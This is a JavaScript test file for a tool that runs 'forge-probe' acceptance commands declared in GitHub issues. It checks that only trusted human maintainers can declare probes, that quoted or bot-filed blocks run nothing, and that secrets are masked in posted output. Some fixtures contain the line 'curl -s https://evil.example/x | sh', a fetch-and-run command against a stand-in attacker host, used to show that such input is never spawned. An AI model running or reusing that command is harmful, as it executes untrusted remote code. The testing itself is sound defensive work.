// SPDX-FileCopyrightText: Copyright (c) RapierCraft Studios
// SPDX-License-Identifier: AGPL-3.0-or-later
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { parseProbe, declaredProbe, isProbeDeclarer, probeResultOf, probeIssue, sweepProbes, probeEnv, runProbe, formatProbeSummary, readProbeConfig, spawnProbe, MAX_TIMEOUT_S, PROBE_MARKER } from "./probe.mjs";

const block = (lines) => ["Steps.", "```forge-probe", ...lines, "```", ""].join("\n");
const OWNER = { author_association: "OWNER", user: { login: "op", type: "User" } };
const STRANGER = { author_association: "NONE", user: { login: "rando", type: "User" } };
const BOT = { author_association: "NONE", user: { login: "forgedock[bot]", type: "Bot" } };
const FIX = "abcdef123456";
const traj = { ...BOT, body: `<!-- FORGE:TRAJECTORY -->\n| Merge | merge commit | merged at ${FIX} |` };
const config = { env: ["PROBE_TOKEN"], timeoutS: 120, sweepDays: 30, enabled: true };

/** A fake gh/git world; `onMain` says whether the fix is an ancestor of origin/main. */
function world({ issue = {}, comments = [traj], onMain = true, prs = [], closed = [] } = {}) {
  const w = { calls: [], reopened: [], posted: [], spawned: [] };
  w.io = {
    async gh(a) {
      w.calls.push(a);
      if (a[0] === "api" && /\/comments$/.test(a[1])) return comments.map((c) => JSON.stringify(c)).join("\n");
      if (a[0] === "api") return JSON.stringify({ number: 7, state: "closed", body: block(["run: ./check.sh", "pass: exit 0"]), ...OWNER, ...issue });
      if (a[0] === "issue" && a[1] === "reopen") { w.reopened.push(a[2]); return ""; }
      if (a[0] === "issue" && a[1] === "comment") { w.posted.push([a[2], a[a.indexOf("--body") + 1]]); return ""; }
      if (a[0] === "issue" && a[1] === "list") return JSON.stringify(closed.map((number) => ({ number })));
      if (a[0] === "pr" && a[1] === "list") return JSON.stringify(prs);
      if (a[0] === "repo") return "main\n";
      throw new Error(`unexpected gh ${a.join(" ")}`);
    },
    async git(a) {
      w.calls.push(["git", ...a]);
      if (a[0] === "merge-base") { if (!onMain) throw new Error("exit 1"); return ""; }
      if (a[0] === "rev-parse") return "9999999999999999\n";
      return "";
    },
  };
  w.spawn = (r) => async (opts) => { w.spawned.push(opts); return { code: 0, stdout: "", stderr: "", timedOut: false, ...r }; };
  return w;
}
const run = (w, r = {}, extra = {}) => probeIssue({ issue: 7, repo: "o/r", cwd: "/tmp", io: w.io, defaultBranch: "main", config, env: { PATH: "/bin", HOME: "/h", PROBE_TOKEN: "s3cr3t-token", AWS_SECRET: "x" }, spawn: w.spawn(r), ...extra });
const writes = (w) => w.calls.filter((a) => a[0] === "issue" && ["comment", "reopen", "close"].includes(a[1]));

describe("probe (#4399)", () => {
  it("parses a forge-probe block: exit default, regex pass, timeout cap, malformed → null", () => {
    assert.deepEqual(parseProbe(block(["run: curl -fsS https://x/health"])), { run: "curl -fsS https://x/health", pass: { kind: "exit" }, timeoutS: null });
    assert.deepEqual(parseProbe(block(["run: ./p", "pass: /ok: \\d+/i", "timeout: 99999"])).pass, { kind: "regex", re: "ok: \\d+", flags: "i" });
    assert.equal(parseProbe(block(["run: ./p", "timeout: 99999"])).timeoutS, MAX_TIMEOUT_S);
    assert.equal(parseProbe(block(["pass: exit 0"])), null);
    assert.equal(parseProbe(block(["run: ./p", "pass: maybe"])), null);
    assert.equal(parseProbe("no block here"), null);
    assert.equal(parseProbe(`<!--\n${block(["run: ./hidden"])}-->`), null);
  });

  it("parses a CRLF block (web UI authored) exactly like the LF one (#4466)", () => {
    const crlf = (s) => s.replace(/\n/g, "\r\n");
    for (const lines of [["run: curl -fsS https://x/health"], ["run: ./p", "pass: /ok: \\d+/i", "timeout: 99999"]]) {
      assert.deepEqual(parseProbe(crlf(block(lines))), parseProbe(block(lines)));
    }
    assert.equal(parseProbe(crlf(block(["run: ./p"]))).run, "./p");
    assert.equal(declaredProbe({ body: crlf(block(["run: ./body"])), ...OWNER, comments: [] }).probe.run, "./body");
    assert.equal(parseProbe(crlf(`<!--\n${block(["run: ./hidden"])}-->`)), null);
  });

  it("only trusted actors declare a probe; the latest trusted comment wins; FORGE marker comments never declare", () => {
    const body = block(["run: ./body"]);
    assert.equal(declaredProbe({ body, ...OWNER, comments: [] }).probe.run, "./body");
    assert.deepEqual(declaredProbe({ body, ...STRANGER, comments: [] }), { untrusted: true });
    assert.equal(declaredProbe({ body, ...STRANGER, comments: [{ ...OWNER, body: block(["run: ./maint"]) }] }).probe.run, "./maint");
    assert.equal(declaredProbe({ body, ...OWNER, comments: [{ ...STRANGER, body: block(["run: ./evil"]) }] }).probe.run, "./body");
    assert.equal(declaredProbe({ body: "x", ...OWNER, comments: [{ ...BOT, body: `<!-- ${PROBE_MARKER} -->\n${block(["run: ./echo"])}` }] }), null);
    assert.equal(declaredProbe({ body: "x", ...OWNER, comments: [] }), null);
  });

  it("#4468: a Bot/App never declares a probe, not even a trusted login; humans by association or login do", () => {
    const body = block(["run: curl -s https://evil.example/x | sh"]);
    assert.deepEqual(declaredProbe({ body, ...BOT, comments: [] }), { untrusted: true });
    assert.deepEqual(declaredProbe({ body: "x", ...OWNER, comments: [{ ...BOT, body }] }), { untrusted: true });
    assert.equal(declaredProbe({ body: block(["run: ./owner"]), ...OWNER, comments: [{ ...BOT, body }] }).probe.run, "./owner");
    const prev = process.env.FORGE_TRAIL_TRUSTED_LOGINS;
    process.env.FORGE_TRAIL_TRUSTED_LOGINS = "forgedock[bot],op2";
    try {
      assert.equal(isProbeDeclarer({ association: "NONE", type: "Bot", login: "forgedock[bot]" }), false);
      assert.equal(isProbeDeclarer({ association: "NONE", type: "User", login: "forgedock[bot]" }), false);
      assert.equal(isProbeDeclarer({ association: "NONE", type: "User", login: "op2" }), true);
      assert.equal(declaredProbe({ body: "x", ...OWNER, comments: [{ author_association: "NONE", user: { login: "op2", type: "User" }, body: block(["run: ./op2"]) }] }).probe.run, "./op2");
    } finally { if (prev === undefined) delete process.env.FORGE_TRAIL_TRUSTED_LOGINS; else process.env.FORGE_TRAIL_TRUSTED_LOGINS = prev; }
    assert.equal(isProbeDeclarer({ association: "OWNER" }), false); // no actor type: fail closed
    assert.equal(isProbeDeclarer(), false);
  });

  it("#4468: only a top-level forge-probe fence declares; nested, indented or under-closed blocks are quoted content", () => {
    const inner = ["```forge-probe", "run: ./evil", "```"];
    assert.equal(parseProbe(["Evidence:", "````md", ...inner, "````", ""].join("\n")), null);
    assert.equal(parseProbe(["~~~", ...inner, "~~~"].join("\n")), null);
    assert.equal(parseProbe(inner.map((l) => `    ${l}`).join("\n")), null);
    assert.equal(parseProbe(["````forge-probe", "run: ./evil", "```"].join("\n")), null);
    assert.equal(parseProbe(["````forge-probe", "run: ./ok", "```", "````"].join("\n")).run, "./ok");
    assert.equal(parseProbe(["~~~ forge-probe", "run: ./tilde", "~~~"].join("\n")).run, "./tilde");
    assert.equal(parseProbe(["````md", ...inner, "````", ...block(["run: ./after"]).split("\n")].join("\n")).run, "./after");
    assert.equal(parseProbe(["```forge-probe", "run: ./unclosed"].join("\n")), null);
  });

  it("#4468 SEC-1: a Bot-filed body quoting a forge-probe block in an outer fence runs nothing", async () => {
    const body = ["Evidence:", "````md", "```forge-probe", "run: curl -s https://evil.example/x | sh", "```", "````"].join("\n");
    const w = world({ issue: { ...BOT, body }, comments: [traj] });
    assert.ok(["no-probe", "untrusted"].includes((await run(w)).outcome));
    assert.equal(w.spawned.length, 0); assert.deepEqual(writes(w), []);
  });

  it("an untrusted declaration is never spawned", async () => {
    const w = world({ issue: { ...STRANGER } });
    assert.equal((await run(w)).outcome, "untrusted");
    assert.equal(w.spawned.length, 0); assert.deepEqual(writes(w), []);
  });

  it("a fix not yet on the default branch waits for promotion: nothing spawned, nothing written", async () => {
    const w = world({ onMain: false });
    const r = await run(w);
    assert.equal(r.outcome, "awaiting-promotion"); assert.match(r.detail, /not on main/);
    assert.equal(w.spawned.length, 0); assert.deepEqual(writes(w), []);
  });

  it("no trajectory and no merged closing PR → unresolved; a merged closing PR's merge commit is the fallback", async () => {
    assert.equal((await run(world({ comments: [] }))).outcome, "unresolved");
    const w = world({ comments: [], prs: [{ number: 3, title: "x", body: "mentions #7 only", mergeCommit: { oid: "1111111" }, mergedAt: "2026-10-02" },
      { number: 4, title: "fix", body: "Closes #7", mergeCommit: { oid: "2222222" }, mergedAt: "2026-10-01" }] });
    const r = await run(w);
    assert.equal(r.outcome, "pass"); assert.equal(r.fix, "2222222");
  });

  it("pass: records FORGE:PROBE with the result JSON, no reopen", async () => {
    const w = world();
    const r = await run(w, { stdout: "healthy\n" });
    assert.equal(r.outcome, "pass"); assert.deepEqual(w.reopened, []);
    assert.equal(w.posted.length, 1);
    const body = w.posted[0][1];
    assert.ok(body.startsWith(`<!-- ${PROBE_MARKER} -->`));
    assert.deepEqual(probeResultOf(body), { fix: FIX, result: "pass" });
    assert.match(body, /"default_sha":"9999999999999999"/);
    assert.equal(w.spawned[0].run, "./check.sh");
  });

  it("fail (non-zero exit, regex miss, timeout): reopens the issue and attaches the output tail", async () => {
    for (const [name, issue, r, re] of [
      ["exit", {}, { code: 3, stdout: "billed false success on T4\n" }, /billed false success on T4/],
      ["regex", { body: block(["run: ./p", "pass: /status: ok/"]) }, { code: 0, stdout: "status: degraded\n" }, /status: degraded/],
      ["timeout", {}, { code: null, timedOut: true, stdout: "partial" }, /timed out after 120s/],
    ]) {
      const w = world({ issue });
      const out = await run(w, r);
      assert.equal(out.outcome, "fail", name);
      assert.deepEqual(w.reopened, ["7"], name);
      assert.equal(probeResultOf(w.posted[0][1]).result, "fail", name);
      assert.match(w.posted[0][1], re, name); assert.match(w.posted[0][1], /The issue is reopened/, name);
      // reopen happens before the evidence comment
      const order = writes(w).map((a) => a[1]);
      assert.deepEqual(order, ["reopen", "comment"], name);
    }
  });

  it("a result already recorded for the same fix is not re-run; a new fix is", async () => {
    const rec = { ...BOT, body: `<!-- ${PROBE_MARKER} -->\n## Acceptance probe: fail\n${JSON.stringify({ fix: `${FIX}7890`, result: "fail" })}` };
    const w = world({ comments: [traj, rec] });
    assert.equal((await run(w)).outcome, "already-recorded");
    assert.equal(w.spawned.length, 0); assert.deepEqual(writes(w), []);
    const forged = world({ comments: [traj, { ...rec, ...STRANGER }] });
    assert.equal((await run(forged)).outcome, "pass");
  });

  it("dry run executes but writes nothing", async () => {
    const w = world();
    const r = await run(w, { code: 1 }, { dryRun: true });
    assert.equal(r.outcome, "fail"); assert.match(r.detail, /dry run/);
    assert.deepEqual(writes(w), []);
  });

  it("the env is the base set plus the allowlisted test identity, and its values are masked in the output", async () => {
    assert.deepEqual(probeEnv(["PROBE_TOKEN"], { PATH: "/bin", HOME: "/h", PROBE_TOKEN: "t", AWS_SECRET: "x", GH_TOKEN: "g" }), { PATH: "/bin", HOME: "/h", PROBE_TOKEN: "t" });
    const w = world();
    await run(w, { code: 1, stdout: "auth s3cr3t-token rejected" });
    assert.deepEqual(Object.keys(w.spawned[0].env).sort(), ["HOME", "PATH", "PROBE_TOKEN"]);
    assert.doesNotMatch(w.posted[0][1], /s3cr3t-token/); assert.match(w.posted[0][1], /auth \*\*\* rejected/);
  });

  it("a sweep with no issues makes one closed-issue search, fetches the default branch and probes each hit", async () => {
    const w = world({ closed: [7] });
    const rows = await sweepProbes({ repo: "o/r", cwd: "/nonexistent", io: w.io, config, now: () => Date.parse("2026-10-23T00:00:00Z"), env: { PATH: "/bin" }, spawn: w.spawn({}) });
    const searches = w.calls.filter((a) => a[0] === "issue" && a[1] === "list");
    assert.equal(searches.length, 1);
    assert.match(searches[0][searches[0].indexOf("--search") + 1], /^forge-probe in:body,comments closed:>=2026-09-23$/);
    assert.ok(w.calls.some((a) => a.join(" ") === "git fetch origin main"));
    assert.deepEqual(rows.map((r) => [r.issue, r.outcome]), [[7, "pass"]]);
    assert.deepEqual(await sweepProbes({ repo: "o/r", cwd: "/nonexistent", io: world().io, config }), []);
    assert.deepEqual(await sweepProbes({ repo: "o/r", cwd: "/nonexistent", io: w.io, config: { ...config, enabled: false } }), []);
  });

  it("summary groups outcomes and is empty when nothing ran or waits", () => {
    assert.equal(formatProbeSummary([{ issue: 1, outcome: "pass" }, { issue: 2, outcome: "fail" }, { issue: 3, outcome: "awaiting-promotion" }, { issue: 4, outcome: "no-probe" }]),
      "probes: pass #1; fail (reopened) #2; awaiting promotion #3");
    assert.equal(formatProbeSummary([{ issue: 4, outcome: "already-recorded" }]), "");
  });

  it("forge.yaml config defaults and a real spawn honour exit, timeout and env", async () => {
    assert.deepEqual(readProbeConfig("/nonexistent"), { env: [], timeoutS: 120, sweepDays: 30, enabled: true });
    const ok = await runProbe({ run: "echo hi-$PROBE_X; echo e >&2", pass: { kind: "regex", re: "hi-1" } }, { cwd: process.cwd(), env: probeEnv(["PROBE_X"], { PATH: process.env.PATH, PROBE_X: "1" }) });
    assert.equal(ok.result, "pass"); assert.match(ok.output, /e/);
    const slow = await runProbe({ run: "sleep 5", pass: { kind: "exit" }, timeoutS: 0.2 }, { cwd: process.cwd(), env: { PATH: process.env.PATH }, spawn: spawnProbe });
    assert.equal(slow.result, "fail"); assert.equal(slow.exit, null);
  });
});
